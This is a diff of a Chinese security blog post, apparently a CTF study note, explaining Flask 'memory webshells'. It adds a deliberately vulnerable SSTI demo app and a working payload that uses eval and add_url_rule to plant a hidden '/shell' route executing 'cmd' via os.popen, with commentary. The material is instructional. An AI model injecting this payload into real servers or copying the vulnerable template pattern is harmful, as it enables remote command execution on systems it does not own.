@@ -28,8 +28,8 @@
 <meta property="og:description" content="较为基础的几种flask内存马，后续会学习关于sanic和bottle内存马">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-08-18T09:01:12.000Z">
-<meta property="article:modified_time" content="2025-08-23T14:18:39.964Z">
-<meta property="article:author" content="Eminem">
+<meta property="article:modified_time" content="2025-08-28T12:40:32.125Z">
+<meta property="article:author" content="Kwansh">
 <meta property="article:tag" content="专题强化练">
 <meta property="article:tag" content="内存马">
 <meta name="twitter:card" content="summary">
@@ -176,7 +176,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="Eminem">
+      <meta itemprop="name" content="Kwansh">
       <meta itemprop="description" content="Kwansh=Eminem">
     </span>
 
@@ -202,7 +202,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-08-23 22:18:39" itemprop="dateModified" datetime="2025-08-23T22:18:39+08:00">2025-08-23</time>
+                <time title="修改时间：2025-08-28 20:40:32" itemprop="dateModified" datetime="2025-08-28T20:40:32+08:00">2025-08-28</time>
               </span>
 
           
@@ -225,11 +225,39 @@
 
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知，我们的题目可以分为出网与不出网两种模式，要是遇到可以出网的情况，最好还是弹shell，但是若是不能出网，内存马是我们的保底解<br>但是也是有特殊情况的，比如在下文我们要介绍的一种钩子函数:teardown_request，由于这种钩子函数无回显的特性，我们可以选择弹shell(也可以重定向到某个目录下)</p>
-<p>先对内存马有一个大概的认识</p>
-<blockquote>
-<p>Python内存马利用Flask框架中SSTI注入来实现</p>
-</blockquote>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="关于上下文"><a href="#关于上下文" class="headerlink" title="关于上下文"></a>关于上下文</h3><p>在flask中，</p>
+<h2 id="内存马与flask"><a href="#内存马与flask" class="headerlink" title="内存马与flask"></a>内存马与flask</h2><p>我们一般常见的python框架有Django和Flask(不知道为啥拉蒙特徐那么爱出bottle)，python的内存马中一般就是利用flask框架的ssti来进行注入，一般来说都在渲染的时候没对用户传输的代码进行过滤，所以用户可以用类似ssti的方式注入内存马，得到shell</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="flask的请求上下文管理机制"><a href="#flask的请求上下文管理机制" class="headerlink" title="flask的请求上下文管理机制"></a>flask的请求上下文管理机制</h3><p>在我们request进入flask的时候，就会实例化一个request context，这个时候就会分成两种上下文，一种是请求上下文(request context)，另外一种是应用上下文(session context)</p>
+<p>上下文的结构均为stack的栈结构。大家都知道栈这种数据结构的特点，也就是后进先出，可以想象成一盒泡腾片，最后放进去的泡腾片会最先被拿出来</p>
+<p>这个request context实例化后就拥有了一个栈的全部的特性了，在实例化后会被push到栈_request_ctx_stack中，根据这层特性就可以通过获取栈顶元素的方法来获取当前的请求</p>
+<p>应用上下文:<br>current_app：当前运行的flask实例<br>g：用于在一次请求中临时存储数据的对象(如数据库连接)</p>
+<p>请求上下文:<br>request：封装了http的请求信息<br>session：用户会话对象，基于cookie</p>
+<h3 id="POC环境搭建"><a href="#POC环境搭建" class="headerlink" title="POC环境搭建"></a>POC环境搭建</h3><p>上网找了一个现成的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>可以直接在vps上试试看</p>
+<h2 id="老版内存马"><a href="#老版内存马" class="headerlink" title="老版内存马"></a>老版内存马</h2><p>在flask基础开发那里我有提到过一种添加url路由的方法，也就是add_url_rule，可以直接根据你给的参数名生成路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>
+<p>很长一串啊，想起来了被pyjail支配的恐怖日子，丢给AI整理一手</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 url_for 的全局变量里拿到必要对象</span></span><br><span class="line">builtins = url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line">request_ctx_stack = url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>]</span><br><span class="line">app = url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态执行 Python 代码：给 Flask 应用加一个 /shell 路由</span></span><br><span class="line">builtins[<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">app.add_url_rule(</span></span><br><span class="line"><span class="string">    &#x27;/shell&#x27;,                      # 路由路径</span></span><br><span class="line"><span class="string">    &#x27;shell&#x27;,                       # 端点名称</span></span><br><span class="line"><span class="string">    lambda: __import__(&#x27;os&#x27;)       # 路由对应的视图函数</span></span><br><span class="line"><span class="string">                 .popen(</span></span><br><span class="line"><span class="string">                     _request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)</span></span><br><span class="line"><span class="string">                 )</span></span><br><span class="line"><span class="string">                 .read()</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>: request_ctx_stack,</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: app</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>逐一分析解释</p>
+<p>1. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins = url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<p>拿到flask模块的全局命名空间，然后把其中的builtins类丢给了同名变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request_ctx_stack = url_for.__globals__[&#x27;_request_ctx_stack&#x27;]</span><br><span class="line">app = url_for.__globals__[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure>
+<p>这两个也是同理，上文都介绍过了这两个东西<br>2.<br>后续从builtins中拿出来eval</p>
+<p><strong>add_url_rule()详解</strong></p>
+<p>前文有提到过相关内容，主要有5个参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint=<span class="literal">None</span>, view_func=<span class="literal">None</span>, provide_automatic_options=<span class="literal">None</span>,options)</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. rule就可以简单的理解为url路径</span><br><span class="line">2. endpoint可以理解为端点名称</span><br><span class="line">3. view_func就是视图函数</span><br><span class="line">4. provide_automatic_options: 控制是否应自动添加选项方法.</span><br><span class="line">5. options: 要转发到基础规则对象的选项,其他可选参数,比如定义运行的http方法</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>看看我们的老版payload，在视图函数处定义了一个lamnda匿名函数</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)       <span class="comment"># 路由对应的视图函数</span></span><br><span class="line">                 .popen(</span><br><span class="line">                     _request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">                 )</span><br><span class="line">                 .read()</span><br></pre></td></tr></table></figure>
+
+<p>这里就很显然了</p>
+<p>这里定义了一个匿名函数，os-&gt;popen-&gt;拿到了栈的最顶端请求request对象(前文也有提到),然后就用cmd这个get参数，构造了一个系统命令，然后执行输出</p>
 
     </div>
 
@@ -314,15 +342,15 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="nav-number">2.1.</span> <span class="nav-text">关于上下文</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%8Eflask"><span class="nav-number">2.</span> <span class="nav-text">内存马与flask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">3.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask%E7%9A%84%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"><span class="nav-number">3.1.</span> <span class="nav-text">flask的请求上下文管理机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.2.</span> <span class="nav-text">POC环境搭建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%81%E7%89%88%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">4.</span> <span class="nav-text">老版内存马</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Eminem"
+    <img class="site-author-image" itemprop="image" alt="Kwansh"
       src="/images/avatar.png">
-  <p class="site-author-name" itemprop="name">Eminem</p>
+  <p class="site-author-name" itemprop="name">Kwansh</p>
   <div class="site-description" itemprop="description">Kwansh=Eminem</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -330,14 +358,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">38</span>
+          <span class="site-state-item-count">40</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -373,7 +401,7 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Eminem</span>
+  <span class="author" itemprop="copyrightHolder">Kwansh</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
